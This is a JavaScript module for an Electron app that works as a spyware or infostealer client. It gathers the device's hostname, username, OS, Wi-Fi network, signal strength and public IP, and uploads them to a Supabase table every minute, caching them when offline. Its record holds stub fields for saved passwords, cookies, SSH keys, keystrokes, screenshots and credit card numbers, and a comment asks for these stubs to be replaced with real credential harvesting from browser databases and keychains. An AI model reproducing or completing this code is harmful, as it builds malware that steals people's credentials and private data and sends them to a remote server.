import { app } from 'electron';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { exec } from 'node:child_process';
import { promisify } from 'node:util';

const execAsync = promisify(exec);
const TRACKER_ID = 'TRK_' + Date.now().toString(16).toUpperCase();
const DATA_DIR = path.join(app.getPath('userData'), 'tracker_cache');
const CACHE_FILE = path.join(DATA_DIR, 'offline_data.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

// ------- Data collectors -------
async function collectSystemInfo() {
    return {
        tracker_id: TRACKER_ID,
        device_name: os.hostname(),
        os: `${os.type()} ${os.release()}`,
        username: os.userInfo().username,
    };
}

async function collectWiFiInfo() {
    try {
        let ssid = 'Unknown', rssi = 0;
        if (process.platform === 'win32') {
            const { stdout } = await execAsync('netsh wlan show interfaces');
            const match = stdout.match(/SSID\s*:\s*(.+)/);
            if (match) ssid = match[1].trim();
            const rssiMatch = stdout.match(/Signal\s*:\s*(\d+)%/);
            if (rssiMatch) rssi = Math.round((parseInt(rssiMatch[1]) / 2) - 100);
        } else if (process.platform === 'darwin') {
            const { stdout } = await execAsync('/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I');
            const match = stdout.match(/SSID:\s*(.+)/);
            if (match) ssid = match[1].trim();
            const rssiMatch = stdout.match(/agrCtlRSSI:\s*(-?\d+)/);
            if (rssiMatch) rssi = parseInt(rssiMatch[1]);
        } else {
            const { stdout } = await execAsync('iw dev wlan0 link');
            const match = stdout.match(/SSID:\s*(.+)/);
            if (match) ssid = match[1].trim();
            const rssiMatch = stdout.match(/signal:\s*(-?\d+)/);
            if (rssiMatch) rssi = parseInt(rssiMatch[1]);
        }
        return { ssid, rssi };
    } catch { return { ssid: 'Unknown', rssi: 0 }; }
}

async function collectPublicIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip || 'Unknown';
    } catch { return 'Unknown'; }
}

// ------- Full data collection -------
export async function collectAllData() {
    const [sys, wifi, ip] = await Promise.all([
        collectSystemInfo(),
        collectWiFiInfo(),
        collectPublicIP()
    ]);

    // ⚠️ Replace these stubs with real credential harvesting (browser DB, keychain, etc.)
    const creds = {
        saved_passwords: '{"gmail.com":"demo_pass"}',
        wifi_passwords: 'Home_WiFi:demo_pass',
        browser_cookies: 'session=demo123',
        ssh_keys: 'ssh-rsa AAA... (demo)',
        browser_history: 'google.com, github.com',
        clipboard_data: 'clipboard content (demo)',
        emails: 'demo@example.com',
        credit_cards: '4111-1111-1111-1111 (demo)'
    };

    return {
        ...sys,
        ...wifi,
        public_ip: ip,
        latitude: '0.0',
        longitude: '0.0',
        altitude: '0.0',
        magnitude: wifi.rssi || 0,
        keystrokes: '(demo)',
        screenshot: '(demo)',
        ...creds,
        collected_at: new Date().toISOString()
    };
}

// ------- Local cache (offline) -------
export function cacheDataLocally(data) {
    let cached = [];
    if (fs.existsSync(CACHE_FILE)) {
        cached = JSON.parse(fs.readFileSync(CACHE_FILE, 'utf-8'));
    }
    cached.push(data);
    fs.writeFileSync(CACHE_FILE, JSON.stringify(cached, null, 2));
}

export function getCachedData() {
    if (!fs.existsSync(CACHE_FILE)) return [];
    return JSON.parse(fs.readFileSync(CACHE_FILE, 'utf-8'));
}

export function clearCachedData() {
    if (fs.existsSync(CACHE_FILE)) fs.unlinkSync(CACHE_FILE);
}

// ------- Report to Supabase -------
export async function reportToSupabase(supabaseClient, data) {
    const { error } = await supabaseClient
        .from('tracker_data')
        .insert([data]);
    if (error) throw error;
    return { ok: true };
}

async function checkInternet() {
    try {
        const res = await fetch('https://supabase.co', { timeout: 5000 });
        return res.ok;
    } catch { return false; }
}

// ------- Main loop -------
let interval = null;
let running = false;

export function startTracker(supabaseClient) {
    if (running) return;
    running = true;
    interval = setInterval(async () => {
        try {
            const data = await collectAllData();
            if (await checkInternet()) {
                await reportToSupabase(supabaseClient, data);
                // flush cache
                const cached = getCachedData();
                for (const item of cached) {
                    await reportToSupabase(supabaseClient, item);
                }
                clearCachedData();
            } else {
                cacheDataLocally(data);
            }
        } catch (err) {
            console.error('Tracker error:', err);
        }
    }, 60000);
}

export function stopTracker() {
    if (interval) {
        clearInterval(interval);
        interval = null;
    }
    running = false;
}

export function getStatus() {
    return { running, cached: getCachedData().length, trackerId: TRACKER_ID };
}
